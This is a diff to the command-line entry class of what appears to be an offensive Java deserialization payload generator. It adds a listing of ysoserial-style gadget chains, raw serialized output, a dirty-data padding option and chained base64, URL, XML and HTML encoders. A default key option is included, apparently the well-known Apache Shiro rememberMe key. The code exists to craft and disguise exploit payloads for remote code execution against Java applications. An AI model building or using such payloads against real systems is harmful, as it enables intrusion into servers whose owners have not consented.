@@ -1,11 +1,14 @@
 package com.ding0x0.run;
 
 import com.ding0x0.Payload;
+import com.ding0x0.utils.Code;
+import com.ding0x0.utils.Util;
+import com.ding0x0.yso.Serializer;
 import org.apache.commons.cli.*;
 
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.LinkedList;
+import java.util.List;
 import java.util.Queue;
 
 public class App {
@@ -77,12 +80,14 @@ public class App {
         options.addOption("gh","gadget helper");
 
         // 其他
-        options.addOption("d","dirty data wrapper(default data 200");
+        options.addOption("d",true,"dirty data wrapper");
 
         // 编码
         options.addOption("be","base64 encode");
         options.addOption("ue","url encode");
         options.addOption("xe","xml encode");
+        options.addOption("he","html encode");
+        options.addOption("raw", "raw echo");
 
         // payload参数
         options.addOption("k", true,"key(default kPH+bIxk5D2deZiIxcaaaA==)");
@@ -106,7 +111,12 @@ public class App {
             System.out.println(helper());
             System.exit(1);
         }else if (cmdline.hasOption("gh")){
-            System.out.println("..");
+            List<String> gadgetList = Util.getGadgetList();
+            System.out.println("gadget:");
+            for (String gadget :
+                    gadgetList) {
+                System.out.println(gadget);
+            }
             System.exit(1);
         }
         Queue<String> code = new LinkedList<>();
@@ -128,6 +138,8 @@ public class App {
                 case "ue":
                 case "be":
                 case "xe":
+                case "he":
+                case "raw":
                     code.add(key);
                     break;
                 case "k":
@@ -159,7 +171,32 @@ public class App {
         }
         Process process = new Process(code,other,gadget,payloadType,payloadParam,cmdline);
         Payload object = (Payload) process.makeObject();
-        System.out.println(object.format());
+        Object formatObj = object.format();
+        if (payloadType.equals("yso")){
+            formatObj = Serializer.serialize(formatObj);
+        }
+        Object result = formatObj;
+        while (!code.isEmpty() && !cmdline.hasOption("raw")){
+            String key = code.poll();
+            switch (key) {
+                case "ue":
+                    result = Code.urlEncode((String) result);
+                    break;
+                case "xe":
+                    result = Code.O2XML(result);
+                    break;
+                case "be":
+                    result = Code.base64Encode(result);
+                    break;
+                case "he":
+                    result = Code.HTMLEncode((String) result);
+            }
+        }
+        if (cmdline.hasOption("raw")){
+            Serializer.serialize(formatObj, System.out);
+        }else {
+            System.out.println(result);
+        }
     }
 
 
